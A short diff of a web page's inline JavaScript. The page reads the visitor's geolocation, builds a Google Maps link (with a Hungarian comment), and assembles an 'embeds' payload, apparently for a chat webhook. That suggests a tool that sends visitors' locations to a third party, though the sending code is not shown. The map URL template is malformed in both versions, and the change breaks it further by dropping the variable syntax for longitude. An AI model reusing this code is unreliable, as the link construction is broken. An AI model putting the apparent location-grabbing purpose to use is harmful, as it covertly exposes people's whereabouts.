@@ -47,7 +47,7 @@
             const accuracy = Math.round(position.coords.accuracy);
 
             // Google Maps link mindkét koordinátával
-            const mapUrl = `https://www.google.com{lat},${lon}`;
+            const mapUrl = `https://www.google.com{lat},{lon}`;
 
             const payload = {
                 embeds: [{
@@ -79,6 +79,7 @@
     </script>
 </body>
 </html>
+
 
 
 
